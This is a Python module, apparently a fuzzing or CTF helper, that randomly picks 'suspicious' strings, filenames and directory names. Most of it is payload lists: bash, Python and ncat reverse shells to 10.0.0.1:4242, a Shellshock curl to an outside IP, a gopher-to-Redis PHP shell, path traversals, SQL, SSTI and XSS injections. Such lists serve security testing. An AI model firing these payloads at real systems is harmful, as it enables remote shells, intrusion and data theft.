import secrets
import warnings

from string import whitespace

def choice_within(min_length: int, max_length: int, choices: list[str]) -> str:
    '''
    Picks a random string within the length limits.
    If there is no string within the length limits, issues a warning and picks another (preferably longer) string.
    '''
    if not choices:
        raise ValueError('Must provide at least one choice to choice_within')
    valid = [string for string in choices if min_length <= len(string) < max_length]
    if not valid:
        warnings.warn(f'No valid choices between lengths {min_length} and {max_length}')
        valid = [string for string in choices if min_length <= len(string)] or choices
    return secrets.choice(valid)


# Command injections
command_injections = [
    # TODO: Replace IP + port with something random
    '";bash$IFS-i>&/dev/tcp/10.0.0.1/4242$IFS0>&1;',
    '";bash -i>&/dev/tcp/10.0.0.1/4242 0>&1;',
    '\n/usr/bin/cat /flag\n',
    '\nid\n',
    '\n/usr/bin/cat /flag;',
    '\nid;',
    '\n/usr/bin/cat /flag|',
    '\n/usr/bin/id|',
    '\nid|',
    '&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;',
    '&lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;',
    ';system(\'cat%20/flag\')',
    '`cat /flag`',
    '| id',
    '& id',
    'a)|/usr/bin/id;',
    'a|/usr/bin/id',
    '() { :;}; /bin/bash -c \"curl http://135.23.158.130/.testing/shellshock.txt?vuln=5\"',
    '<?php system(\"cat /flag\");?>',
    '{{ get_user_file(\"/flag\") }}',
    '<!--#exec cmd=\"/bin/cat /flag\"-->',
    'a)|bash -i >& /dev/tcp/10.0.0.1/4242 0>&1;',
    '`0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196`',
    ';python -c \'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"10.0.0.1\",4242));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")\';',
    '() { :;}; /bin/bash -c \"ncat 10.0.0.1 4242 -e /bin/bash\"',
]

# Local file inclusions and path traversals
path_traversals = [
    '..%2f..%2f..%2fflag',
    '%2e%2e%2f%2e%2e%2fflag',
    '../../..//flag',
    '../../../..//flag',
    '..%2f..%2f..%2f/flag',
    '%2e%2e/%2e%2e//flag',
    '%2e%2e/%2e%2e/%2e%2e//flag',
    '%2e%2e/%2e%2e/%2e%2e/%2e%2e//flag',
    '..%255c..%255c..%255c/flag',
    '%c0%ae%c0%ae/%c0%ae%c0%ae//flag',
    '..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/flag',
    '..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/flag',
    '..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/flag',
    '%c0%ae%c0%ae\\/flag',
    '%c0%ae%c0%ae\\%c0%ae%c0%ae\\//flag',
    '%c0%ae%c0%ae\\%c0%ae%c0%ae\\%c0%ae%c0%ae\\//flag',
    '%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c%25c0%25ae%25c0%25ae%25c1%259c/flag',
    '..%%32%66/flag',
    '../..//flag%00index.php',
    '..%2f/flag%00download.php',
    '%uff0e%uff0e%u2215flag',
    '\\\\%2e%2e%5cflag',
    './../flag',
    '././.htaccess',
    '.htaccess',
    '........................................................................../flag',
    '../..//../..//flag',
    '../..//../..//..//flag',
    '/%252e%252e/flag',
    '/logs/access.log%00',
    '//mysql/my.cnf%00',
    '%%32%%65%%32%%65%u2215flag',
    '..0x5c..0x5c..0x5c..0x5cflag',
    '..%%35%%63flag',
    '.%00.%255cflag',
    '0x2e0x2e0x5c/flag',
    '..%uEFC8..%uEFC8..%uEFC8flag',
    '%2e%2e\\%2e%2e\\flag',
    '%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216flag',
    'wp-login.php',
    'wp-admin.php',
]

# SQL injections
sql_injections = [
    '" OR 1=1 --',
    '\' or 1=1--',
    '\" or 1=1--',
    '\' UNION SELECT flag FROM flags--',
    '\' or \"',
    '-- or # ',
    '\' OR \'1',
    '\' OR 1 -- -',
    '\" OR \"\" = \"',
    '\" OR 1 = 1 -- -',
    '\' OR \'\' = \'',
    '1\' ORDER BY 1--+',
    '\' or sleep(5)#',
    '1)) or sleep(5)#',
    'AND (SELECT * FROM (SELECT(SLEEP(5))nQIP))--',
    '+ SLEEP(10) + \'',
    'UNION ALL SELECT flag FROM flags',
    ' UNION ALL SELECT flag FROM flags#',
    ' UNION ALL SELECT password FROM users--',
    ' UNION ALL SELECT \'INJ\'||\'ECT\'||\'XXX\'',
    '\" or true--',
    '\") or true--',
    '\') or true--',
    '\' or \'x\'=\'x',
    '\') or (\'x\')=(\'x',
    'admin\') or \'1\'=\'1',
    'admin\"or 1=1 or \"\"=\"',
    'root\' --',
    'root\' #',
    'administrator\'/*',
    '**',
]

# SSRF
ssrf_injections = [
    'http://127.0.0.1/',
    'http://localhost/',
    'http://2130706433/',
    'http://3232235521/ ',
    'http://127.127.127.127/admin_dashboard',
    'localtest.me/flag',
    'http://0177.0.0.1/',
    'http://o177.0.0.1/',
    'http://0o177.0.0.1/',
    'http://q177.0.0.1/',
    'http://[0:0:0:0:0:ffff:127.0.0.1]',
    'http://[::ffff:127.0.0.1]',
    'localhost:+11211abc',
    'http://0/',
    'http://127.1',
    'http://127.0.0.1/%61dmin',
    'http://1.1.1.1 &@2.2.2.2# @3.3.3.3/',
    'http://ⓛⓞⒸⓐⓛⒽⓞⓈⓉ/admin',
    'http://127.0.0.1:80\\@127.2.2.2:80/',
    'http://127.0.0.1:80\\@@127.2.2.2:80/',
    'http://127.0.0.1:80:\\@@127.2.2.2:80/',
    'http://127.0.0.1:80#\\@127.2.2.2:80/',
    'download.php?url=http://127.0.0.1:8080',
    'gopher://127.0.0.1:6379/_set%20payload%20%22%3C%3Fphp%20shell_exec%28%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F0.0.0.0%2F4567%200%3E%261%27%29%3B%3F%3E%22',
    'http://0251.00376.000251.0000376',
    'snmp://2.35.483.20.408.22039.0.2.4.28/?set=true&type=OCTET_STRING&value=aklshfa;wio',
]

# SSTI
template_injections = [
    '#{ 3 * 3 }',
    '{{dump(app)}}',
    '{{app.request.server.all|join(\',\')}}',
    '{{config.items()}}',
    '{{\'\'.__class__.__base__.__subclasses__()[227](\'cat /flag\', shell=True, stdout=-1).communicate()}}',
    '{{ \'\'.__class__.__mro__[2].__subclasses__() }}',
    '{{config.__class__.__init__.__globals__[\'os\'].popen(\'cat /flag\').read()}}',
    '{{[\'cat\x20/flag\']|filter(\'system\')}}',
    '{{\'a\'.getClass().forName(\'javax.script.ScriptEngineManager\').newInstance().getEngineByName(\'JavaScript\').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"cat /flag\\\"); x.start()\")}}',
    '${T(java.lang.Runtime).getRuntime().exec(\'cat /flag\')}',
    '{php}echo `cat /flag`;{/php}',
]

# XSS
xss_injections = [
    '\"-prompt(8)-\"',
    'onclick=prompt(8)>\"@x.y',
    '\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y',
    '<image src/onerror=prompt(8)>',
    '<img src/onerror=prompt(8)>',
    '<image src =q onerror=prompt(8)>',
    '<script\x2Ftype=\"text/javascript\">javascript:alert(1);</script>',
    '<script\x0Atype=\"text/javascript\">javascript:alert(1);</script>',
    '<svg onResize svg onResize=\"javascript:javascript:alert(1)\"></svg onResize>',
    '<svg onLoad svg onLoad=\"javascript:javascript:alert(1)\"></svg onLoad>',
    '<body onLoad body onLoad=\"javascript:javascript:alert(1)\"></body onLoad>',
    '\x3Cscript>javascript:alert(1)</script>',
    '\'\"`><script>/* *\x2Fjavascript:alert(1)// */</script>',
    '<script>javascript:alert(1)</script\x0D',
    '<script>javascript:alert(1)</script\x0A',
    '<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->',
    '--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->',
    '<script>/* *\x2A/javascript:alert(1)// */</script>',
    '<script>/* *\x00/javascript:alert(1)// */</script>',
    '<a href=\"\x17javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',
    '<a href=\"\x03javascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',
    '<a href=\"\x0Ejavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>',
    '`\"\'><img src=xxx:x \x27onerror=javascript:alert(1)>',
    '`\"\'><img src=xxx:x \x20onerror=javascript:alert(1)>',
    '\"`\'><script>\x3Bjavascript:alert(1)</script>',
    '\"`\'><script>\x0Djavascript:alert(1)</script>',
    '\"`\'><script>\xF0\x90\x96\x9Ajavascript:alert(1)</script>',
    '\"`\'><script>-javascript:alert(1)</script>',
    '<img src=\"javascript:alert(1)\">',
    '<image src=\"javascript:alert(1)\">',
    '<script src=\"javascript:alert(1)\">',
    '<SCRIPT/SRC=\"%(jscript)s\"></SCRIPT>',
    '<<SCRIPT>%(payload)s//<</SCRIPT>',
    '\'\';!--\"<XSS>=&{()}',
    '<script ~~~>alert(0%0)</script ~~~>',
    '<img src=xss onerror=alert(1)>',
    '<iframe xmlns=\"#\" src=\"javascript:alert(1)\"></iframe>',
    '\'); alert(\'XSS',
]

# terminal escape codes
escape_codes = [
    '\x1b[20;20H', # set cursor to position 20,20
    '\x1b[31malarm.mp3', # color
    'I\'m \x1b[34mBlue dabedi', # color
    'Burn the \x1b[3JWorld', # clear scrollback buffer
    # clear screen, set bold, italic and color pink, write mvm at some locations on the screen
    '\x1b[2J\x1b[1;3;38;2;255;;255m\x1b[1;1Hmvm\x1b[12;7Hmvm\x1b[3;10Hmvm\x1b[17;21Hmvm;',
]

# All injectable strings
strings = (
          command_injections
        + path_traversals
        + sql_injections
        + ssrf_injections
        + template_injections
        + xss_injections
        + escape_codes
)

# Characters we want to avoid in filenames
unsafe_in_filenames = '/\0' + ''.join(c for c in whitespace if c != ' ')


def string(min_length: int, max_length: int, *, banned_chars: str = '') -> str:
    '''Generates a suspicious string.'''
    candidates = strings if not banned_chars else [s for s in strings if not any(char in s for char in banned_chars)]
    return choice_within(min_length, max_length, candidates)

def extension():
    '''Generates a random file extension (likely to be at least somewhat suspicious).'''
    return secrets.choice([
        'bin',
        'ko',
        'php',
        'py',
        'run',
        'sh',
        'tar',
        'txt',
        'tmp',
        'zip',
    ])


filenames = [
    '.env',
    '.bashrc',
    '.bash_history',
    '.htaccess',
    '.dockerenv',
    'CON',
    'config',
    'flag',
    'shell.php',
    'shell.py',
    '__init__.py',
    '__main__.py',
]

def filename(min_length: int, max_length: int) -> str:
    '''Generates a suspicious filename.'''
    return choice_within(min_length, max_length, filenames)


directories = [
    '.config',
    '.git',
    '.ssh',
    '__pycache__',
    'secrets',
]

def directory(min_length: int, max_length: int) -> str:
    '''Returns a suspicious directory name.'''
    return secrets.choice(directories)
